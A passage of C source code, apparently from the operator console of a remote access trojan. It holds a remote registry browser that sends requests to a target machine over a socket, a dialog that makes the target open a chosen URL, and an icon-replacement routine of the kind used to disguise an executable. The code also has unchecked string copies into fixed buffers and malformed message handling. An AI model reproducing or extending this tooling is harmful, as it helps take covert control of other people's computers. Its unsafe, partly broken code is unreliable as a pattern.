	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;
	item.iImage = 1;
	item.iSubItem=0;
	item.pszText=Name;
	item.iItem=ListView_InsertItem(GetDlgItem(hwndReg,IDC_REGKEYLIST),&item);

	item.iSubItem=1;
	item.pszText="REG_BINARY";
	ListView_SetItem(GetDlgItem(hwndReg,IDC_REGKEYLIST),&item);
		break;
	case REG_DWORD:
	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;
	item.iImage = 1;
	item.iSubItem=0;
	item.pszText=Name;
	item.iItem=ListView_InsertItem(GetDlgItem(hwndReg,IDC_REGKEYLIST),&item);

	item.iSubItem=1;
	item.pszText="REG_DWORD";
	ListView_SetItem(GetDlgItem(hwndReg,IDC_REGKEYLIST),&item);
		break;
	case REG_DWORD_BIG_ENDIAN:
	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;
	item.iImage = 1;
	item.iSubItem=0;
	item.pszText=Name;
	item.iItem=ListView_InsertItem(GetDlgItem(hwndReg,IDC_REGKEYLIST),&item);

	item.iSubItem=1;
	item.pszText="REG_DWORD_BIG_ENDIAN";
	ListView_SetItem(GetDlgItem(hwndReg,IDC_REGKEYLIST),&item);
		break;
	case REG_EXPAND_SZ:
	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;
	item.iImage = 0;
	item.iSubItem=0;
	item.pszText=Name;
	item.iItem=ListView_InsertItem(GetDlgItem(hwndReg,IDC_REGKEYLIST),&item);

	item.iSubItem=1;
	item.pszText="REG_EXPAND_SZ";
	ListView_SetItem(GetDlgItem(hwndReg,IDC_REGKEYLIST),&item);
		break;
	case REG_LINK:
	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;
	item.iImage = 1;
	item.iSubItem=0;
	item.pszText=Name;
	item.iItem=ListView_InsertItem(GetDlgItem(hwndReg,IDC_REGKEYLIST),&item);

	item.iSubItem=1;
	item.pszText="REG_LINK";
	ListView_SetItem(GetDlgItem(hwndReg,IDC_REGKEYLIST),&item);
		break;
	case REG_MULTI_SZ:
	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;
	item.iImage = 0;
	item.iSubItem=0;
	item.pszText=Name;
	item.iItem=ListView_InsertItem(GetDlgItem(hwndReg,IDC_REGKEYLIST),&item);

	item.iSubItem=1;
	item.pszText="REG_MULTI_SZ";
	ListView_SetItem(GetDlgItem(hwndReg,IDC_REGKEYLIST),&item);
		break;
	case REG_NONE:
	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;
	item.iImage = 1;
	item.iSubItem=0;
	item.pszText=Name;
	item.iItem=ListView_InsertItem(GetDlgItem(hwndReg,IDC_REGKEYLIST),&item);

	item.iSubItem=1;
	item.pszText="REG_NONE";
	ListView_SetItem(GetDlgItem(hwndReg,IDC_REGKEYLIST),&item);
		break;
	case REG_QWORD:
	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;
	item.iImage = 1;
	item.iSubItem=0;
	item.pszText=Name;
	item.iItem=ListView_InsertItem(GetDlgItem(hwndReg,IDC_REGKEYLIST),&item);

	item.iSubItem=1;
	item.pszText="REG_QWORD";
	ListView_SetItem(GetDlgItem(hwndReg,IDC_REGKEYLIST),&item);
		break;
	case REG_SZ:
	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;
	item.iImage = 0;
	item.iSubItem=0;
	item.pszText=Name;
	item.iItem=ListView_InsertItem(GetDlgItem(hwndReg,IDC_REGKEYLIST),&item);

	item.iSubItem=1;
	item.pszText="REG_SZ";
	ListView_SetItem(GetDlgItem(hwndReg,IDC_REGKEYLIST),&item);
		break;
	}
	item.iSubItem=2;
	item.pszText=Value;
	ListView_SetItem(GetDlgItem(hwndReg,IDC_REGKEYLIST),&item);
	ListView_SetImageList(GetDlgItem(hwndReg, IDC_REGKEYLIST),RTLImageList, LVSIL_SMALL);

return 0;
}


int GetParentTreeDir(HWND hwnd, HTREEITEM hitem, char * Buf)
{
char A [1024] = "";
char B [1024] = "";
char C [1024] = "";
int BA = 0;
HTREEITEM hitemA;
HTREEITEM hitemB;
//////////////////////////////////////////
					strcpy(B, C);
					strcpy(C, Buf);
					strcat(C, "\\");
					strcat(C, B);
					strcpy(TreeDir,C);
					//MessageBox(NULL, C, "C", MB_OK);

//////////////////////////////////////////
hitemA = TreeView_GetParent(GetDlgItem(hwnd, IDC_REGTREE), hitem);


			    TreeView_EnsureVisible(hwnd,hitemA);
			    SendDlgItemMessage(hwnd,IDC_REGTREE,TVM_SELECTITEM,TVGN_CARET,(LPARAM)hitemA);
				flagSelected=true;
	            tvi.mask=TVIF_TEXT;
				tvi.pszText=A;
				tvi.cchTextMax=256;
				tvi.hItem=hitemA;


					if(SendDlgItemMessage(hwnd,IDC_REGTREE,TVM_GETITEM,TVGN_CARET,(LPARAM)&tvi))
					{
					//MessageBox(NULL, A, "A", MB_OK);

					if(strstr(A, "HKEY_CLASSES_ROOT"))
					{
					    strcpy(TreeRoot,"HKEY_CLASSES_ROOT");
						strcpy(SEND.KeyPath, C);
						SEND.PacketType = REQ_REG_MAN;
						SEND.Hkey_ID = 0;
						//MessageBox(NULL, C, "C", MB_OK);
                        SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                        SendDataKB+=SSizeKB;
                        SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                        UpdateStats();
                        return 0;
					}
					if(strstr(A, "HKEY_CURRENT_USER"))
					{
					    strcpy(TreeRoot,"HKEY_CURRENT_USER");
						strcpy(SEND.KeyPath, C);
						SEND.PacketType = REQ_REG_MAN;
						SEND.Hkey_ID = 1;
						//MessageBox(NULL, C, "C", MB_OK);
                        SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                        SendDataKB+=SSizeKB;
                        SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                        UpdateStats();
                        return 0;
					}
					if(strstr(A, "HKEY_LOCAL_MACHINE"))
					{
					    strcpy(TreeRoot,"HKEY_LOCAL_MACHINE");
						strcpy(SEND.KeyPath, C);
						SEND.PacketType = REQ_REG_MAN;
						SEND.Hkey_ID = 2;
						//MessageBox(NULL, C, "C", MB_OK);
                        SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                        SendDataKB+=SSizeKB;
                        SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                        UpdateStats();
                        return 0;
					}
					if(strstr(A, "HKEY_USERS"))
					{
					    strcpy(TreeRoot,"HKEY_USERS");
						strcpy(SEND.KeyPath, C);
						SEND.PacketType = REQ_REG_MAN;
						SEND.Hkey_ID = 3;
						//MessageBox(NULL, C, "C", MB_OK);
                        SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                        SendDataKB+=SSizeKB;
                        SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                        UpdateStats();
                        return 0;
					}
					if(strstr(A, "HKEY_CURRENT_CONFIG"))
					{
					    strcpy(TreeRoot,"HKEY_CURRENT_CONFIG");
						strcpy(SEND.KeyPath, C);
						SEND.Hkey_ID = 4;
						SEND.PacketType = REQ_REG_MAN;
						//MessageBox(NULL, C, "C", MB_OK);
                        SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                        SendDataKB+=SSizeKB;
                        SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                        UpdateStats();
						return 0;
					}
					strcpy(B, C);
					strcpy(C, A);
					strcat(C, "\\");
					strcat(C, B);
					strcpy(TreeDir,C);
				//	MessageBox(NULL, C, "C", MB_OK);
					}
while(1)
{
switch(BA)
	{
	case 0:
		hitemB = TreeView_GetParent(GetDlgItem(hwnd, IDC_REGTREE), hitemA);

			    TreeView_EnsureVisible(hwnd,hitemB);
			    SendDlgItemMessage(hwnd,IDC_REGTREE,TVM_SELECTITEM,TVGN_CARET,(LPARAM)hitemB);
				flagSelected=true;
	            tvi.mask=TVIF_TEXT;
				tvi.pszText=A;
				tvi.cchTextMax=256;
				tvi.hItem=hitemB;
				if(SendDlgItemMessage(hwnd,IDC_REGTREE,TVM_GETITEM,TVGN_CARET,(LPARAM)&tvi))
					{

					if(strstr(A, "HKEY_CLASSES_ROOT"))
					{
					    strcpy(TreeRoot,"HKEY_CLASSES_ROOT");
						strcpy(SEND.KeyPath, C);
						SEND.PacketType = REQ_REG_MAN;
						SEND.Hkey_ID = 0;
						//MessageBox(NULL, C, "C", MB_OK);
                        SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                        SendDataKB+=SSizeKB;
                        SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                        UpdateStats();
						return 0;
					}
					if(strstr(A, "HKEY_CURRENT_USER"))
					{
					    strcpy(TreeRoot,"HKEY_CURRENT_USER");
						strcpy(SEND.KeyPath, C);
						SEND.PacketType = REQ_REG_MAN;
						SEND.Hkey_ID = 1;
						//MessageBox(NULL, C, "C", MB_OK);
                        SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                        SendDataKB+=SSizeKB;
                        SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                        UpdateStats();
						return 0;
					}
					if(strstr(A, "HKEY_LOCAL_MACHINE"))
					{
					    strcpy(TreeRoot,"HKEY_LOCAL_MACHINE");
						strcpy(SEND.KeyPath, C);
						SEND.PacketType = REQ_REG_MAN;
						SEND.Hkey_ID = 2;
						//MessageBox(NULL, C, "C", MB_OK);
                        SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                        SendDataKB+=SSizeKB;
                        SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                        UpdateStats();
                        return 0;
					}
					if(strstr(A, "HKEY_USERS"))
					{
					    strcpy(TreeRoot,"HKEY_USERS");
						strcpy(SEND.KeyPath, C);
						SEND.PacketType = REQ_REG_MAN;
						SEND.Hkey_ID = 3;
						//MessageBox(NULL, C, "C", MB_OK);
                        SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                        SendDataKB+=SSizeKB;
                        SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                        UpdateStats();
                        return 0;
					}
					if(strstr(A, "HKEY_CURRENT_CONFIG"))
					{
					    strcpy(TreeRoot,"HKEY_CURRENT_CONFIG");
						strcpy(SEND.KeyPath, C);
						SEND.Hkey_ID = 4;
						SEND.PacketType = REQ_REG_MAN;
						//MessageBox(NULL, C, "C", MB_OK);
                        SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                        SendDataKB+=SSizeKB;
                        SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                        UpdateStats();						return 0;
					}
					strcpy(B, C);
					strcpy(C, A);
					strcat(C, "\\");
					strcat(C, B);
					strcpy(TreeDir,C);

					}
				//MessageBox(NULL, C, "C", MB_OK);

					BA = 1;
		break;

	case 1:
				hitemA = TreeView_GetParent(GetDlgItem(hwnd, IDC_REGTREE), hitemB);

			    TreeView_EnsureVisible(hwnd,hitemA);
			    SendDlgItemMessage(hwnd,IDC_REGTREE,TVM_SELECTITEM,TVGN_CARET,(LPARAM)hitemA);
				flagSelected=true;
	            tvi.mask=TVIF_TEXT;
				tvi.pszText=A;
				tvi.cchTextMax=256;
				tvi.hItem=hitemA;

					if(SendDlgItemMessage(hwnd,IDC_REGTREE,TVM_GETITEM,TVGN_CARET,(LPARAM)&tvi))
					{

					if(strstr(A, "HKEY_CLASSES_ROOT"))
					{
					    strcpy(TreeRoot,"HKEY_CLASSES_ROOT");
						strcpy(SEND.KeyPath, C);
						SEND.PacketType = REQ_REG_MAN;
						SEND.Hkey_ID = 0;
						//MessageBox(NULL, C, "C", MB_OK);
                        SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                        SendDataKB+=SSizeKB;
                        SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                        UpdateStats();
                        return 0;
					}
					if(strstr(A, "HKEY_CURRENT_USER"))
					{
					    strcpy(TreeRoot,"HKEY_CURRENT_USER");
						strcpy(SEND.KeyPath, C);
						SEND.PacketType = REQ_REG_MAN;
						SEND.Hkey_ID = 1;
						//MessageBox(NULL, C, "C", MB_OK);
                        SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                        SendDataKB+=SSizeKB;
                        SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                        UpdateStats();
                        return 0;
					}
					if(strstr(A, "HKEY_LOCAL_MACHINE"))
					{
					    strcpy(TreeRoot,"HKEY_LOCAL_MACHINE");
						strcpy(SEND.KeyPath, C);
						SEND.PacketType = REQ_REG_MAN;
						SEND.Hkey_ID = 2;
						//MessageBox(NULL, C, "C", MB_OK);
                        SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                        SendDataKB+=SSizeKB;
                        SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                        UpdateStats();
                        return 0;
					}
					if(strstr(A, "HKEY_USERS"))
					{
					    strcpy(TreeRoot,"HKEY_USERS");
						strcpy(SEND.KeyPath, C);
						SEND.PacketType = REQ_REG_MAN;
						SEND.Hkey_ID = 3;
						//MessageBox(NULL, C, "C", MB_OK);
                        SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                        SendDataKB+=SSizeKB;
                        SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                        UpdateStats();
                        return 0;
					}
					if(strstr(A, "HKEY_CURRENT_CONFIG"))
					{
					    strcpy(TreeRoot,"HKEY_CURRENT_CONFIG");
						strcpy(SEND.KeyPath, C);
						SEND.Hkey_ID = 4;
						SEND.PacketType = REQ_REG_MAN;
						//MessageBox(NULL, C, "C", MB_OK);
                        SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                        SendDataKB+=SSizeKB;
                        SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                        UpdateStats();
                        return 0;
					}
					strcpy(B, C);
					strcpy(C, A);
					strcat(C, "\\");
					strcat(C, B);
					strcpy(TreeDir,C);

					}
					BA = 0;
		break;
	}

}

return 0;
}





LRESULT CALLBACK Reg_Dlg_Proc(HWND hwndRDlg,UINT message,WPARAM wParam,LPARAM lParam)
{

    switch(message)
    {
    case WM_INITDIALOG:
    {

        hStatus9 = CreateWindowEx(0, STATUSCLASSNAME,
                                  NULL, WS_CHILD | WS_VISIBLE |
                                  SBARS_SIZEGRIP, 0,0,0,0,hwndRDlg,
                                  (HMENU) IDC_REG_STATUS,
                                  GetModuleHandle(NULL), NULL);

        RTree=GetDlgItem(hwndRDlg,IDC_REGTREE);


        RTImageList=ImageList_Create(16,16,ILC_COLOR16,2,30);

        hBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_REG_TREE1), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(RTImageList,hBitMap,NULL);
        DeleteObject(hBitMap);


        hBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_REG_TREE2), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(RTImageList,hBitMap,NULL);
        DeleteObject(hBitMap);

        SendDlgItemMessage(hwndRDlg,IDC_REGTREE,TVM_SETIMAGELIST,0,(LPARAM)RTImageList);




        tvinsert.hParent=NULL; // top most level Item
        // root level item attribute.
        tvinsert.hInsertAfter=TVI_ROOT;
        // attributs
        tvinsert.item.mask=TVIF_TEXT|TVIF_IMAGE;//|TVIF_SELECTEDIMAGE;
        tvinsert.item.iImage=1;

        tvinsert.item.pszText="HKEY_CLASSES_ROOT";

        RTParent=(HTREEITEM)SendDlgItemMessage(hwndRDlg,IDC_REGTREE,TVM_INSERTITEM,0,(LPARAM)&tvinsert);
        //TreeView_Select(GetDlgItem(hwndRDlg,IDC_REGTREE), RTSelected, TVGN_CARET);
        //TreeView_Expand(GetDlgItem(hwndRDlg,IDC_REGTREE), RTSelected, TVM_EXPAND);

        tvinsert.hParent=NULL; // top most level Item
        // root level item attribute.
        tvinsert.hInsertAfter=TVI_ROOT;
        // attributs
        tvinsert.item.mask=TVIF_TEXT|TVIF_IMAGE;//|TVIF_SELECTEDIMAGE;
        tvinsert.item.iImage=1;

        tvinsert.item.pszText="HKEY_CURRENT_USER";

        RTParent=(HTREEITEM)SendDlgItemMessage(hwndRDlg,IDC_REGTREE,TVM_INSERTITEM,0,(LPARAM)&tvinsert);
        //TreeView_Select(GetDlgItem(hwndRDlg,IDC_REGTREE), RTSelected, TVGN_CARET);
        //TreeView_Expand(GetDlgItem(hwndRDlg,IDC_REGTREE), RTSelected, TVM_EXPAND);



        tvinsert.hParent=NULL; // top most level Item
        // root level item attribute.
        tvinsert.hInsertAfter=TVI_ROOT;
        // attributs
        tvinsert.item.mask=TVIF_TEXT|TVIF_IMAGE;//|TVIF_SELECTEDIMAGE;
        tvinsert.item.iImage=1;

        tvinsert.item.pszText="HKEY_LOCAL_MACHINE";

        RTParent=(HTREEITEM)SendDlgItemMessage(hwndRDlg,IDC_REGTREE,TVM_INSERTITEM,0,(LPARAM)&tvinsert);
        //TreeView_Select(GetDlgItem(hwndRDlg,IDC_REGTREE), RTSelected, TVGN_CARET);
        //TreeView_Expand(GetDlgItem(hwndRDlg,IDC_REGTREE), RTSelected, TVM_EXPAND);


        tvinsert.hParent=NULL; // top most level Item
        // root level item attribute.
        tvinsert.hInsertAfter=TVI_ROOT;
        // attributs
        tvinsert.item.mask=TVIF_TEXT|TVIF_IMAGE;//|TVIF_SELECTEDIMAGE;
        tvinsert.item.iImage=1;

        tvinsert.item.pszText="HKEY_USERS";

        RTParent=(HTREEITEM)SendDlgItemMessage(hwndRDlg,IDC_REGTREE,TVM_INSERTITEM,0,(LPARAM)&tvinsert);
        //TreeView_Select(GetDlgItem(hwndRDlg,IDC_REGTREE), RTSelected, TVGN_CARET);
        //TreeView_Expand(GetDlgItem(hwndRDlg,IDC_REGTREE), RTSelected, TVM_EXPAND);



        tvinsert.hParent=NULL; // top most level Item
        // root level item attribute.
        tvinsert.hInsertAfter=TVI_ROOT;
        // attributs
        tvinsert.item.mask=TVIF_TEXT|TVIF_IMAGE;//|TVIF_SELECTEDIMAGE;
        tvinsert.item.iImage=1;

        tvinsert.item.pszText="HKEY_CURRENT_CONFIG";

        RTParent=(HTREEITEM)SendDlgItemMessage(hwndRDlg,IDC_REGTREE,TVM_INSERTITEM,0,(LPARAM)&tvinsert);
        //TreeView_Select(GetDlgItem(hwndRDlg,IDC_REGTREE), RTSelected, TVGN_CARET);
        //TreeView_Expand(GetDlgItem(hwndRDlg,IDC_REGTREE), RTSelected, TVM_EXPAND);


        hList10=GetDlgItem(hwndRDlg,IDC_REGKEYLIST);

        RTLImageList=ImageList_Create(16,16,ILC_COLOR16,2,30);

        hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_REG_TREE3), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
        ImageList_AddIcon(RTLImageList, hIcon);							      // Macro: Attach the image, to the image list
        DeleteObject(hIcon);


        hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_REG_TREE4), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
        ImageList_AddIcon(RTLImageList, hIcon);							      // Macro: Attach the image, to the image list
        DeleteObject(hIcon);

        SendDlgItemMessage(hwndRDlg,IDC_REGKEYLIST,TVM_SETIMAGELIST,0,(LPARAM)RTLImageList);


        memset(&LvCol,0,sizeof(LvCol));                  // Zero Members
        LvCol.cx=0;                                   // width between each coloum
// Inserting Couloms as much as we want

        ListView_SetExtendedListViewStyle(hList10, exStyles);

        LvCol.mask=LVCF_TEXT|LVCF_WIDTH/*|LVCF_IMAGE*/;    // Type of mask
        LvCol.cx=150;                                   // width of column
        LvCol.pszText="Name";                            // First Header Text
        SendMessage(hList10,LVM_INSERTCOLUMN,0,(LPARAM)&LvCol); // Insert/Show the coloum
        LvCol.cx=90;                                   // width of column
        LvCol.pszText="Type";                            // Next coloum
        SendMessage(hList10,LVM_INSERTCOLUMN,1,(LPARAM)&LvCol); // ...
        LvCol.cx=130;                                   // width of column
        LvCol.pszText="Data";                            // Next coloum
        SendMessage(hList10,LVM_INSERTCOLUMN,2,(LPARAM)&LvCol); // ...
        memset(&LvItem,0,sizeof(LvItem)); // Zero struct's Members

        LvItem.mask=LVIF_TEXT|LVIF_IMAGE;   // Text Style
        LvItem.cchTextMax = 256; // Max size of test
        LvItem.iItem=0;          // choose item
        LvItem.iSubItem=0;       // Put in first coluom


    }
    break;

    case WM_NOTIFY:
    {

        case IDC_REGTREE:
        {

            if(((LPNMHDR)lParam)->code == NM_DBLCLK)
            {
                memset(&tvi,0,sizeof(tvi));
                RTSelected=(HTREEITEM)SendDlgItemMessage(hwndReg,
                                                       IDC_REGTREE,TVM_GETNEXTITEM,TVGN_CARET,(LPARAM)RTSelected);

                TreeView_EnsureVisible(hwndRDlg,RTSelected);
                SendDlgItemMessage(hwndRDlg,IDC_TREE1,
                                   TVM_SELECTITEM,TVGN_CARET,(LPARAM)RTSelected);

                flagSelected=true;
                tvi.mask=TVIF_TEXT;
                tvi.pszText=RTemp;
                tvi.cchTextMax=256;
                tvi.hItem=RTSelected;

                if(SendDlgItemMessage(hwndRDlg,IDC_REGTREE,TVM_GETITEM,TVGN_CARET,(LPARAM)&tvi))
                {

                  ZeroMemory(&TreeDir[0],sizeof(TreeDir));

                  if(strstr(RTemp, "HKEY_CLASSES_ROOT"))
                  {
                      DeleteChild(hwndRDlg, IDC_REGTREE, RTSelected);
                      SendMessage(hList10,LVM_DELETEALLITEMS,0,0);
                      strcpy(SEND.KeyPath," ");
                      SEND.PacketType = REQ_REG_MAN;
                      SEND.Hkey_ID = 0;
                      SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                      SendDataKB+=SSizeKB;
                      SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                      UpdateStats();
                      strcpy(TreeRoot,"HKEY_CLASSES_ROOT");
                      break;
                  }


                  if(strstr(RTemp, "HKEY_CURRENT_USER"))
                  {
                      DeleteChild(hwndRDlg, IDC_REGTREE, RTSelected);
                      SendMessage(hList10,LVM_DELETEALLITEMS,0,0);
                      strcpy(SEND.KeyPath,"");
                      SEND.PacketType = REQ_REG_MAN;
                      SEND.Hkey_ID = 1;
                      SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                      SendDataKB+=SSizeKB;
                      SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                      UpdateStats();
                      strcpy(TreeRoot,"HKEY_CURRENT_USER");
                      break;
                  }


                  if(strstr(RTemp, "HKEY_LOCAL_MACHINE"))
                  {
                      DeleteChild(hwndRDlg, IDC_REGTREE, RTSelected);
                      SendMessage(hList10,LVM_DELETEALLITEMS,0,0);
                      strcpy(SEND.KeyPath,"");
                      SEND.Hkey_ID = 2;
                      SEND.PacketType = REQ_REG_MAN;
                      SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                      SendDataKB+=SSizeKB;
                      SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                      UpdateStats();
                      strcpy(TreeRoot,"HKEY_LOCAL_MACHINE");
                      break;
                  }


                  if(strstr(RTemp, "HKEY_USERS"))
                  {
                      DeleteChild(hwndRDlg, IDC_REGTREE, RTSelected);
                      SendMessage(hList10,LVM_DELETEALLITEMS,0,0);
                      strcpy(SEND.KeyPath,"");
                      SEND.PacketType = REQ_REG_MAN;
                      SEND.Hkey_ID = 3;
                      SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                      SendDataKB+=SSizeKB;
                      SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                      UpdateStats();
                      strcpy(TreeRoot,"HKEY_USERS");
                      break;

                  }


                  if(strstr(RTemp, "HKEY_CURRENT_CONFIG"))
                  {
                      DeleteChild(hwndRDlg, IDC_REGTREE, RTSelected);
                      SendMessage(hList10,LVM_DELETEALLITEMS,0,0);
                      strcpy(SEND.KeyPath,"");
                      SEND.PacketType = REQ_REG_MAN;
                      SEND.Hkey_ID = 4;
                      SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                      SendDataKB+=SSizeKB;
                      SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                      UpdateStats();
                      strcpy(TreeRoot,"HKEY_CURRENT_CONFIG");
                      break;
                  }
                      //default:
                     // {
                      DeleteChild(hwndRDlg, IDC_REGTREE, RTSelected);
                      SendMessage(hList10,LVM_DELETEALLITEMS,0,0);
                      GetParentTreeDir(hwndReg, RTSelected, RTemp);
                      break;
                     // }
                }

            }

        }
        break;

    }
    break;

    case WM_CLOSE:
    {
        EndDialog(hwndReg,0);

    }
    break;

    }
    return FALSE;

}

DWORD WINAPI RegWindow(LPVOID lpParam)
{

    hwndReg = CreateDialog(rInst,(LPCTSTR)IDD_REGMAN_DLG,NULL,(DLGPROC)Reg_Dlg_Proc);
    ShowWindow(hwndReg,SW_SHOW);

    SendMessage(hwndReg, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON)));
    SendMessage(hwndReg, WM_SETICON, ICON_BIG, (LPARAM)LoadIcon(NULL, MAKEINTRESOURCE(IDI_ICON)));


    MSG msg;
    while(GetMessage(&msg,hwndReg,0,0)==TRUE)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;


}







BOOL CALLBACK BrowseWeb_DlgProc(HWND hwndBWdlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch(message)
    {
    case WM_INITDIALOG:
    {

        SetWindowText(GetDlgItem(hwndBWdlg, IDC_URL_EDIT), "http://");

    }
    break;

    case WM_COMMAND:
    {
        switch(LOWORD(wParam))
        {
        case IDC_URL_GO:
        {
            char geturl[256];

            GetWindowText(GetDlgItem(hwndBWdlg, IDC_URL_EDIT), geturl, 256);


                strcpy(SEND.URL,geturl);
                SEND.PacketType = BROWSE_WEB;
                SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                SendDataKB+=SSizeKB;
                SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                UpdateStats();
                EndDialog(hwndBWdlg,0);

        }
        break;

        }
    }
    return TRUE;

    case WM_CLOSE:
    {
        EndDialog(hwndBWdlg,0);
    }
    break;


    }
    return FALSE;
}





DWORD WINAPI BrowseWebWindow(LPVOID lpParam)
{
    hwndWebpage = CreateDialog(BWInst,(LPCTSTR)BROWSE_WEB_DLG,NULL,(DLGPROC)BrowseWeb_DlgProc);
    ShowWindow(hwndWebpage,SW_SHOW);

    SendMessage(hwndWebpage, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON)));
    SendMessage(hwndWebpage, WM_SETICON, ICON_BIG, (LPARAM)LoadIcon(NULL, MAKEINTRESOURCE(IDI_ICON)));


    MSG msg;
    while(GetMessage(&msg,hwndWebpage,0,0)==TRUE)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;

}








HINSTANCE hInst;

DWORD dwFileSize;
LPBYTE lpFileBuffer;

CHAR szEFileName[MAX_PATH];
CHAR szIFileName[MAX_PATH];

/*BOOL LoadPE(LPSTR szFileName)
{
    HANDLE hFile = CreateFile(szFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if(hFile == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }
    dwFileSize = GetFileSize(hFile, NULL);
    if(dwFileSize == INVALID_FILE_SIZE)
    {
        return FALSE;
    }
    lpFileBuffer = (LPBYTE)realloc(lpFileBuffer, dwFileSize);
    if(lpFileBuffer == NULL)
    {
        return FALSE;
    }
    DWORD dwBytesRead;
    ReadFile(hFile, lpFileBuffer, dwFileSize, &dwBytesRead, NULL);
    CloseHandle(hFile);
    pidh = (PIMAGE_DOS_HEADER)&lpFileBuffer[0];
    if(pidh->e_magic != IMAGE_DOS_SIGNATURE)
    {
        free(lpFileBuffer);
        return FALSE;
    }
    pinh = (PIMAGE_NT_HEADERS)&lpFileBuffer[pidh->e_lfanew];
    if(pinh->Signature != IMAGE_NT_SIGNATURE)
    {
        free(lpFileBuffer);
        return FALSE;
    }
    return TRUE;
}*/

BOOL AddIcon(LPSTR szIFileName, LPSTR szEFileName)
{
    HANDLE hFile = CreateFile(szIFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if(hFile == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }
    LPICONDIR lpid;
    lpid = (LPICONDIR)malloc(sizeof(ICONDIR));
    if(lpid == NULL)
    {
        return FALSE;
    }
    DWORD dwBytesRead;
    ReadFile(hFile, &lpid->idReserved, sizeof(WORD), &dwBytesRead, NULL);
    ReadFile(hFile, &lpid->idType, sizeof(WORD), &dwBytesRead, NULL);
    ReadFile(hFile, &lpid->idCount, sizeof(WORD), &dwBytesRead, NULL);
    lpid = (LPICONDIR)realloc(lpid, (sizeof(WORD) * 3) + (sizeof(ICONDIRENTRY) * lpid->idCount));
    if(lpid == NULL)
    {
        return FALSE;
    }
    ReadFile(hFile, &lpid->idEntries[0], sizeof(ICONDIRENTRY) * lpid->idCount, &dwBytesRead, NULL);
    LPGRPICONDIR lpgid;
    lpgid = (LPGRPICONDIR)malloc(sizeof(GRPICONDIR));
    if(lpgid == NULL)
    {
        return FALSE;
    }
    lpgid->idReserved = lpid->idReserved;
    lpgid->idType = lpid->idType;
    lpgid->idCount = lpid->idCount;
